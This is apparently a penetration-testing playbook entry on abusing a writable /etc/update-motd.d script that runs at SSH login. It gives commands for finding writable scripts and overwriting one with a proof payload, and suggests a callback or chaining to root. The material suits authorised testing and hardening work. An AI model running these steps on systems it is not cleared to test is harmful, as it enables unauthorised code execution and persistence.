# LPRIV-17. Writable MOTD script

**Run this when:** `/etc/update-motd.d/` or a script under it is writable.

Writable MOTD scripts, PAM hook:

```bash
ls -la /etc/update-motd.d 2>/dev/null
find /etc/update-motd.d -maxdepth 1 -type f -writable -ls 2>/dev/null
cat /etc/pam.d/sshd 2>/dev/null | grep -n pam_motd
```

**Look for:** a writable executable script invoked by `pam_motd` on SSH login. It runs as the logging-in user, not root, so use it for a callback or a readable proof.

**If found:** replace the script body and reconnect over SSH:

Proof on next login:

```bash
printf '#!/bin/sh\nid > /tmp/owb-motd\n' > /etc/update-motd.d/<WRITABLE_SCRIPT>
chmod +x /etc/update-motd.d/<WRITABLE_SCRIPT>
```

`/tmp/owb-motd` is written by the next login. For a root-owned file, chain into [LPRIV-18](./lpriv-18) or a root job.
